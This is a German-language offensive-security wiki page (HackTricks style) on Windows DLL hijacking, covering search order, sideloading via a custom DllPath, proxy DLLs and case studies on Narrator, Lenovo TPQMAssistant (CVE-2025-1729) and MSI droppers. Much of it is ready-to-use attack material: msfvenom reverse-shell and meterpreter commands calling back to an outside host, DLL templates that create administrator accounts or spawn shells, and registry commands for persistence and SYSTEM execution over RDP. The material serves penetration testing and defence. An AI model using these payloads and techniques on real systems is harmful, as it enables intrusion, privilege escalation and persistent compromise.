# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

DLL Hijacking beinhaltet das Manipulieren einer vertrauenswürdigen Anwendung, sodass sie eine bösartige DLL lädt. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection, and Side-Loading**. Es wird hauptsächlich für Codeausführung, zum Erreichen von Persistence und, seltener, zur Privilege Escalation verwendet. Obwohl sich dieser Abschnitt auf Escalation konzentriert, bleibt die Hijacking-Methode je nach Zielsetzung gleich.

### Häufige Techniken

Es werden mehrere Methoden für DLL Hijacking verwendet, deren Wirksamkeit von der DLL-Loading-Strategie der Anwendung abhängt:

1. **DLL Replacement**: Ersetzen einer echten DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der Original-DLL beizubehalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen, wobei das Suchmuster der Anwendung ausgenutzt wird.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL, die eine Anwendung zu laden versucht, da sie denkt, es handle sich um eine nicht vorhandene benötigte DLL.
4. **DLL Redirection**: Ändern von Suchparametern wie `%PATH%` oder `.exe.manifest` / `.exe.local` Dateien, um die Anwendung auf die bösartige DLL umzuleiten.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch eine bösartige Version im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading verbunden ist.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich zu Binary Proxy Execution-Techniken.

> [!TIP]
> Für eine Schritt-für-Schritt-Kette, die HTML staging, AES-CTR Konfigurationen und .NET-Implants auf DLL sideloading schichtet, siehe den Workflow unten.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Fehlende DLLs finden

Die gängigste Methode, um fehlende DLLs in einem System zu finden, ist das Ausführen von [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals und das **Setzen** der **folgenden 2 Filter**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

und anschließend nur die **Dateisystem-Aktivität** anzeigen:

![](<../../../images/image (153).png>)

Wenn du allgemein nach **fehlenden DLLs** suchst, lässt du das für einige **Sekunden** laufen.  
Wenn du nach einer **fehlenden DLL innerhalb eines bestimmten Executables** suchst, solltest du einen **zusätzlichen Filter wie "Process Name" "contains" `<exec name>` setzen, das Programm ausführen und das Erfassen der Events stoppen**.

## Ausnutzen fehlender DLLs

Um Privilegien zu eskalieren, ist die beste Chance, in der Lage zu sein, **eine DLL zu schreiben, die ein privilegierter Prozess zu laden versucht**, an einem der **Orte, an denen sie gesucht wird**. Daher können wir eine DLL in einem **Ordner** schreiben, in dem die **DLL vor** dem Ordner gesucht wird, in dem sich die **Original-DLL** befindet (ungewöhnlicher Fall), oder wir können in einen Ordner schreiben, in dem die DLL gesucht wird und die Original-**DLL in keinem Ordner existiert**.

### DLL-Suchreihenfolge

**In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **findest du, wie die DLLs genau geladen werden.**

**Windows-Anwendungen** suchen DLLs anhand einer Reihe vordefinierter Suchpfade und befolgen dabei eine bestimmte Reihenfolge. Das Problem von DLL Hijacking entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der authentischen DLL geladen wird. Eine Lösung zur Vermeidung ist, dass die Anwendung absolute Pfade verwendet, wenn sie auf die benötigten DLLs verweist.

Du kannst die **DLL-Suchreihenfolge auf 32-Bit** Systemen unten sehen:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwende die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) Funktion, um den Pfad dieses Verzeichnisses zu erhalten. (_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses ermittelt, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) Funktion, um den Pfad dieses Verzeichnisses zu erhalten.
1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der PATH-Umgebungsvariablen aufgeführt sind. Beachte, dass dies nicht den pro-Anwendung Pfad einschließt, der durch den **App Paths** Registry-Schlüssel angegeben ist. Der **App Paths**-Schlüssel wird nicht bei der Berechnung des DLL-Suchpfads verwendet.

Das ist die **Standard**-Suchreihenfolge mit aktiviertem **SafeDllSearchMode**. Wenn dieser deaktiviert ist, rückt das aktuelle Verzeichnis auf den zweiten Platz. Um diese Funktion zu deaktivieren, erstelle den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** und setze ihn auf 0 (Standard ist aktiviert).

Wenn die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) Funktion mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachte abschließend, dass **eine DLL durch Angabe des absoluten Pfades statt nur des Namens geladen werden kann**. In diesem Fall wird diese DLL **nur in diesem Pfad gesucht** (wenn die DLL Abhängigkeiten hat, werden diese so gesucht, als wären sie nur nach Namen geladen worden).

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu ändern, die ich hier aber nicht erkläre.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Methode, die DLL-Suchpfade eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, beim Erstellen des Prozesses mit den nativen APIs von ntdll das DllPath-Feld in RTL_USER_PROCESS_PARAMETERS zu setzen. Wenn hier ein vom Angreifer kontrolliertes Verzeichnis angegeben wird, kann ein Zielprozess, der eine importierte DLL nach Namen auflöst (kein absoluter Pfad und ohne die sicheren Ladeflags), gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Kernidee
- Erzeuge die Process-Parameter mit RtlCreateProcessParametersEx und gib ein eigenes DllPath an, das auf deinen kontrollierten Ordner zeigt (z. B. das Verzeichnis, in dem dein Dropper/Unpacker liegt).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn das Ziel-Binary eine DLL nach Namen auflöst, wird der Loader diesen bereitgestellten DllPath bei der Auflösung konsultieren, was zuverlässiges Sideloading ermöglicht, selbst wenn die bösartige DLL nicht mit dem Ziel-EXE koexistiert.

Hinweise/Einschränkungen
- Dies betrifft den erstellten Child-Prozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess beeinflusst.
- Das Ziel muss eine DLL nach Namen importieren oder mit LoadLibrary laden (kein absoluter Pfad und ohne Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und hartkodierte absolute Pfade können nicht hijacked werden. Forwarded Exports und SxS können die Priorität ändern.

Minimales C-Beispiel (ntdll, wide strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Vollständiges C-Beispiel: Erzwingen von DLL-Sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Betriebsbeispiel
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Rechteeskalation

**Anforderungen**:

- Identifiziere einen Prozess, der unter **unterschiedlichen Privilegien** arbeitet oder arbeiten wird (horizontal or lateral movement), der **keine DLL** besitzt.
- Stelle sicher, dass **Schreibzugriff** auf jedes **Verzeichnis** vorhanden ist, in dem nach der **DLL** gesucht wird. Dieser Ort kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Ja, die Voraussetzungen sind schwer zu finden, denn **standardmäßig ist es ziemlich ungewöhnlich, ein privilegiertes ausführbares Programm zu finden, dem eine DLL fehlt** und es ist noch **seltsamer, Schreibrechte in einem Systempfad-Ordner zu haben** (standardmäßig ist das nicht möglich). Aber, in fehlkonfigurierten Umgebungen ist das möglich.\
Falls du Glück hast und die Voraussetzungen erfüllst, könntest du dir das [UACME](https://github.com/hfiref0x/UACME) project ansehen. Auch wenn das **Hauptziel des Projekts die Umgehung von UAC** ist, findest du dort möglicherweise einen **PoC** eines Dll hijaking für die entsprechende Windows-Version, den du nutzen kannst (wahrscheinlich reicht es, den Pfad des Ordners zu ändern, in dem du Schreibrechte hast).

Beachte, dass du deine **Berechtigungen in einem Ordner** prüfen kannst, indem du:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **prüfe die Berechtigungen aller Ordner im PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Du kannst auch die Importe einer ausführbaren Datei und die Exporte einer DLL mit:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking** missbraucht, um Privilegien zu eskalieren, wenn Schreibrechte in einem **System Path folder** vorhanden sind, siehe:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) wird prüfen, ob Sie Schreibrechte für einen Ordner innerhalb des system PATH haben.\
Weitere interessante automatisierte Tools zur Entdeckung dieser Schwachstelle sind die **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll_.

### Beispiel

Falls Sie auf ein ausnutzbares Szenario stoßen, ist eine der wichtigsten Maßnahmen, um es erfolgreich auszunutzen, eine DLL zu erstellen, die mindestens alle Funktionen exportiert, die das ausführbare Programm daraus importieren wird. Beachten Sie außerdem, dass Dll Hijacking praktisch sein kann, um [von Medium Integrity level auf High **(bypassing UAC)** zu eskalieren](../../authentication-credentials-uac-and-efs/index.html#uac) oder von [**High Integrity auf SYSTEM**](../index.html#from-high-integrity-to-system). Sie finden ein Beispiel dafür, **wie man eine gültige dll erstellt**, in dieser DLL-Hijacking-Studie, die sich auf DLL-Hijacking zur Ausführung konzentriert: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Außerdem finden Sie im **nächsten Abschnitt** einige **einfache dll-Beispiele**, die als **Vorlagen** nützlich sein können oder zum Erstellen einer **dll dienen, die nicht benötigte Funktionen exportiert**.

## **Erstellen und Kompilieren von DLLs**

### **Dll Proxifying**

Grundsätzlich ist ein **Dll proxy** eine DLL, die in der Lage ist, **beim Laden Ihren bösartigen Code auszuführen**, aber auch die erwartete Funktionalität bereitzustellen, indem sie **alle Aufrufe an die echte Bibliothek weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) können Sie tatsächlich **eine ausführbare Datei angeben und die Bibliothek auswählen**, die Sie proxifizieren möchten, und eine proxifizierte dll generieren, oder **die dll angeben** und eine proxifizierte dll erzeugen.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen meterpreter (x86) bekommen:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Erstelle einen Benutzer (x86 — ich habe keine x64-Version gefunden):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Eigenes

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **mehrere Funktionen exportieren** muss, die vom victim process geladen werden; existieren diese Funktionen nicht, **wird die binary sie nicht laden können** und der **exploit wird fehlschlagen**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternative C DLL mit Thread-Entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Lokalisierungs-DLL, die für beliebige Codeausführung und Persistenz gehijackt werden kann.

Wichtigste Fakten
- Abfragepfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn eine vom Angreifer kontrollierte, beschreibbare DLL am OneCore-Pfad vorhanden ist, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Keine Exportfunktionen sind erforderlich.

Erkennung mit Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Starte Narrator und beobachte den versuchten Ladevorgang des oben genannten Pfads.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit dem Obigen lädt das Starten von Narrator die platzierte DLL. Auf dem gesicherten Desktop (Anmeldebildschirm) drücken Sie CTRL+WIN+ENTER, um Narrator zu starten.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Die Ausführung endet, wenn die RDP-Sitzung geschlossen wird — inject/migrate daher zügig.

Bring Your Own Accessibility (BYOA)
- Sie können einen integrierten Accessibility Tool (AT)-Registry-Eintrag klonen (z. B. CursorIndicator), ihn so bearbeiten, dass er auf ein beliebiges Binary/DLL zeigt, ihn importieren und dann `configuration` auf diesen AT-Namen setzen. Dadurch wird beliebige Ausführung über das Accessibility-Framework proxied.

Hinweise
- Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordert Admin-Rechte.
- Logik für Payloads kann vollständig in `DLL_PROCESS_ATTACH` leben; keine Exports sind erforderlich.

## Fallstudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), verfolgt als **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Ein Angreifer kann eine bösartige `hostfxr.dll`-Stub in dasselbe Verzeichnis legen und damit die fehlende DLL ausnutzen, um Codeausführung im Kontext des Benutzers zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Angriffsablauf

1. Als Standardbenutzer die Datei `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
2. Auf die scheduled task warten, die um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn ein Administrator eingeloggt ist, wenn die task ausgeführt wird, läuft die schädliche DLL in der Sitzung des Administrators mit medium integrity.
4. Standard UAC bypass techniques verwenden, um von medium integrity auf SYSTEM-Privilegien zu eskalieren.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Angreifer kombinieren häufig MSI-based droppers mit DLL side-loading, um Payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.

Chain overview
- Der Benutzer lädt das MSI herunter. Eine CustomAction läuft still während der GUI-Installation (z. B. LaunchApplication oder eine VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wenn die signierte EXE gestartet wird, lädt die Windows DLL-Suchreihenfolge wsc.dll zuerst aus dem Arbeitsverzeichnis und führt so Angreifer-Code unter einem signierten Parent aus (ATT&CK T1574.001).

MSI-Analyse (wonach suchen)
- CustomAction-Tabelle:
- Nach Einträgen suchen, die Executables oder VBScript ausführen. Beispiel für ein verdächtiges Muster: LaunchApplication, das eine eingebettete Datei im Hintergrund ausführt.
- In Orca (Microsoft Orca.exe) die CustomAction-, InstallExecuteSequence- und Binary-Tabellen untersuchen.
- Eingebettete/gesplittete Payloads in der MSI-CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Nach mehreren kleinen Fragmenten suchen, die von einer VBScript CustomAction zusammengefügt und entschlüsselt werden. Üblicher Ablauf:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktisches Sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien in denselben Ordner:
- wsc_proxy.exe: legitimer signierter Host (Avast). Der Prozess versucht, wsc.dll per Name aus seinem Verzeichnis zu laden.
- wsc.dll: Angreifer-DLL. Wenn keine spezifischen exports erforderlich sind, kann DllMain ausreichen; andernfalls baue eine proxy DLL und leite die benötigten exports an die echte Bibliothek weiter, während du den payload in DllMain ausführst.
- Erstelle ein minimales DLL-Payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Exportanforderungen verwenden Sie ein proxying framework (z. B. DLLirant/Spartacus), um eine forwarding DLL zu erzeugen, die außerdem Ihr payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch die host binary. Wenn der Host absolute Pfade oder sichere Ladeflags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der hijack fehlschlagen.
- KnownDLLs, SxS und forwarded exports können die Priorität beeinflussen und müssen bei der Auswahl der host binary und des export set berücksichtigt werden.

## Referenzen

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
